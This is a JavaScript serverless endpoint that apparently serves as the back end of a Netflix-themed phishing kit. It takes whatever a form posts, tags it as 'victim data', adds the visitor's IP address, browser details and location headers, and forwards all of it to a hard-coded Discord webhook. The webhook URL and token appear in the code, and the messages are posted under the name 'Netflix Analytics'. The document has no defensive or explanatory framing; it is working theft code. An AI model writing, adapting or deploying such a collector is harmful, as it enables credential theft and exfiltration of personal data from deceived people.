export default async function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const victimData = {
            ...req.body,
            timestamp: new Date().toISOString(),
            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
            userAgent: req.headers['user-agent'],
            referer: req.headers['referer'],
            cfCountry: req.headers['cf-ipcountry'],
            cfRegion: req.headers['cf-region'],
            cfCity: req.headers['cf-city']
        };

        // Send to Discord webhook
        await sendToWebhook('VICTIM_DATA', victimData);

        // Return success response
        res.setHeader('Content-Type', 'application/json');
        res.status(200).json({ 
            success: true, 
            message: 'Data processed successfully' 
        });

    } catch (error) {
        console.error('Collection error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
}

async function sendToWebhook(type, data) {
    const webhookUrl = 'https://discord.com/api/webhooks/1435965962900996206/8_no1ovawlBkyTUQEIwx0GQdVaZz0f7C61Zte2KXNYSAJ8hsokVbOgwQXUO7jChnPbrm';
    
    const embed = {
        title: `🎯 ${type} - New Victim Data`,
        color: 0x00ff00,
        fields: [],
        timestamp: new Date().toISOString(),
        footer: {
            text: `Collection System • ${data.ip || 'Unknown IP'}`
        }
    };

    // Add fields dynamically
    Object.entries(data).forEach(([key, value]) => {
        if (value && typeof value === 'object') {
            embed.fields.push({
                name: key,
                value: '```json\n' + JSON.stringify(value, null, 2) + '\n```',
                inline: false
            });
        } else {
            embed.fields.push({
                name: key,
                value: String(value).substring(0, 1024),
                inline: key.length < 15
            });
        }
    });

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: 'Netflix Analytics',
                avatar_url: 'https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png',
                embeds: [embed]
            })
        });
    } catch (error) {
        console.error('Webhook error:', error);
    }
}
